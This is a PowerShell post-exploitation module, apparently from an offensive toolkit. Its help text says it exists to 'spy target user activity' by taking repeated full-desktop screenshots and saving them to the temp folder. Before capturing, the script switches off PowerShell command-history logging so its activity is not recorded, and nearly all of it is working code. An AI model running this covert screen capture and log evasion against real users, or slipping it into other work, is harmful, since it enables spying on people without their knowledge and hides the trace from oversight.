<#
.SYNOPSIS
   Author: @r00t-3xp10it
   Helper - Capture remote desktop screenshot(s)

.DESCRIPTION
   This module can be used to take only one screenshot
   or to spy target user activity using -Delay parameter.

.EXAMPLE
   PS C:\> Get-Help .\Screenshot.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\Screenshot.ps1 -Screenshot 1
   Capture 1 desktop screenshot and store it on %TMP%.

.EXAMPLE
   PS C:\> .\Screenshot.ps1 -Screenshot 5 -Delay 8
   Capture 5 desktop screenshots with 8 secs delay between captures.

.OUTPUTS
   ScreenCaptures Delay  Storage                          
   -------------- -----  -------                          
   1              1(sec) C:\Users\pedro\AppData\Local\Temp
#>


[CmdletBinding(PositionalBinding=$false)] param(
    [int]$Screenshot='0',
    [int]$Delay='1'
)


Write-Host ""
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
If($Screenshot -gt 0){
$Limmit = $Screenshot+1 ## The number of screenshots to be taken
If($Delay -lt '1' -or $Delay -gt '180'){$Delay = '1'} ## Screenshots delay time max\min value accepted

    ## Create Data Table for output
    $mytable = New-Object System.Data.DataTable
    $mytable.Columns.Add("ScreenCaptures")|Out-Null
    $mytable.Columns.Add("Delay")|Out-Null
    $mytable.Columns.Add("Storage")|Out-Null
    $mytable.Rows.Add("$Screenshot",
                      "$Delay(sec)",
                      "$Env:TMP")|Out-Null

    ## Display Data Table
    $mytable|Format-Table -AutoSize > $Env:TMP\MyTable.log
    Get-Content -Path "$Env:TMP\MyTable.log"
    Remove-Item -Path "$Env:TMP\MyTable.log" -Force


    ## Loop Function to take more than one screenshot.
    For($num = 1 ; $num -le $Screenshot ; $num++){

        $OutPutPath = "$Env:TMP"
        $Dep = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 5 |%{[char]$_})
        $FileName = "$Env:TMP\Capture-"+"$Dep.png"
        If(-not(Test-Path "$OutPutPath")){New-Item $OutPutPath -ItemType Directory -Force}
        Add-Type -AssemblyName System.Windows.Forms
        Add-type -AssemblyName System.Drawing
        $ASLR = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $Height = $ASLR.Height;$Width = $ASLR.Width
        $Top = $ASLR.Top;$Left = $ASLR.Left
        $Console = New-Object System.Drawing.Bitmap $Width, $Height
        $AMD = [System.Drawing.Graphics]::FromImage($Console)
        $AMD.CopyFromScreen($Left, $Top, 0, 0, $Console.Size)
        $Console.Save($FileName) 

        Write-Host "$num - Saved: $FileName" -ForegroundColor Yellow
        Start-Sleep -Seconds $Delay; ## 2 seconds delay between screenshots (default value)
    }
    Write-Host "";Start-Sleep -Seconds 1
}